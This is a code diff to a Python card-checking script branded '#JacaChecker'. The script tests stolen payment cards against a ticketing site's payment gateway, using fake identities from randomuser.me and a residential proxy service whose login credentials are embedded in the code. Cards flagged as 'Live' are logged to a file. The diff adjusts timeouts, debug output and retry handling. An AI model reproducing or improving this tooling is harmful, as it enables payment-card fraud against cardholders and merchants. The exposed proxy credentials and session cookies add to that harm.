@@ -104,7 +104,7 @@ def checker(card, month, year, cvv):
             
         
 
-            p = {'https': 'http://brd-customer-hl_b12cf4ef-zone-privado:6f2jb118cxl2@brd.superproxy.io:22225', 'http':'http://brd-customer-hl_b12cf4ef-zone-privado:6f2jb118cxl2:gh5fkkxopi4c@brd.superproxy.io:22225'}
+            p = {'http': 'http://brd-customer-hl_b12cf4ef-zone-privado:6f2jb118cxl2@brd.superproxy.io:22225', 'http':'http://brd-customer-hl_b12cf4ef-zone-privado:6f2jb118cxl2:gh5fkkxopi4c@brd.superproxy.io:22225'}
             url = "https://randomuser.me/api?results=1&gender=&password=upper,lower,12&exc=register,picture,id&nat=US"
             headers = {
                     'Host': 'randomuser.me',
@@ -159,8 +159,8 @@ def checker(card, month, year, cvv):
                 #'Cookie': '_fbp=fb.1.1712014315500.1863181539; PHPSESSID=0b5fb7f955ebe8f673edd97fa4fd3a97; _gid=GA1.2.219304938.1712270413; _gat=1; _ga=GA1.1.1072852156.1712014452; _ga_6BRBZCZGJH=GS1.2.1712270413.3.1.1712270597.41.0.0; _ga_4Y1SMXCRK4=GS1.1.1712270413.3.1.1712270612.0.0.0'
                 }
 
-                response = requests.request("GET", url, headers=headers, data=payload, verify=False, proxies=p)
-                
+                response = requests.request("GET", url, headers=headers, data=payload, verify=False, proxies=p, timeout=1000)
+                print(response.text)
                 auth_key = response.json()['authenticationKey']
 
 
@@ -201,9 +201,9 @@ def checker(card, month, year, cvv):
                 'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7'
                 }
 
-                response = requests.request("POST", url, headers=headers, json=payload, verify=False, proxies=p)
+                response = requests.request("POST", url, headers=headers, json=payload, verify=False, proxies=p, timeout=300)
                 elapsed_time = time.time() - start_time
-            
+                print(response.text)
                 MSegundos = round(elapsed_time, 2)
                 
                 if 'Retry Transaction' in response.text:
@@ -211,7 +211,7 @@ def checker(card, month, year, cvv):
                     bin = api_bin(card[:6])              
                     x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Retry {code} [{MSegundos}] MS"                          
                     open("holdmyticket.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} Retry {code} [{MSegundos}] #JacaChecker\n")
-                    print(Fore.GREEN + f"Live: {x} #JacaChecker")     
+                    print(Fore.GREEN + f"{x} #JacaChecker")     
                     return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"}
                 
                 elif 'issuerResponseCode":"85"' in response.text:
@@ -239,25 +239,25 @@ def checker(card, month, year, cvv):
 
                 else:
                     
-                    print(Fore.RED + 'Consultar Adm !')
-                    return {"code": 2, "mensagem": f"Consultar adm #JacaChecker<br>"}     
+                    print(Fore.RED + 'Gateway Timeout')
+                    return {"code": 2, "mensagem": f"Gateway Timeout #JacaChecker<br>"}     
 
                     
         except requests.exceptions.ProxyError:
             print(Fore.LIGHTWHITE_EX + f"RETESTANDO PROXY: {card}|{month}|{year}|{cvv}")
-            reteste(card, month, year, cvv)
+            #reteste(card, month, year, cvv)
             
         except requests.exceptions.ConnectionError:
             print(Fore.LIGHTWHITE_EX + f"RETESTANDO ConnectionError: {card}|{month}|{year}|{cvv}")
-            reteste(card, month, year, cvv)
-            
+            #reteste(card, month, year, cvv)
         except requests.exceptions.RequestException:
             print(Fore.LIGHTWHITE_EX + f"RETESTANDO RequestException: {card}|{month}|{year}|{cvv}")
-            reteste(card, month, year, cvv)
-            
+            #reteste(card, month, year, cvv)
         except RequisicaoException:
-            print(Fore.LIGHTWHITE_EX + f"RETESTANDO 302: {card}|{month}|{year}|{cvv}")
-            reteste(card, month, year, cvv)
+            print(Fore.LIGHTWHITE_EX + f"RETESTANDO Location: {card}|{month}|{year}|{cvv}")
+            #reteste(card, month, year, cvv)
+            
+            
 
 
 def processar_cartoes(card,mes,ano,cvv):
@@ -268,8 +268,8 @@ def processar_cartoes(card,mes,ano,cvv):
         else:
             return {"code": "", "retorno": "erro no formulario"}
     except:
-        #retorno = reteste(card,mes,ano,cvv)
-        return {"code": "", "retorno": "EXCEPTION ! CONTATE ADM SE PERSISTIR"}
+        retorno = checker(card,mes,ano,cvv)
+        return {"code": "", "retorno": retorno["mensagem"]}
     
     
 
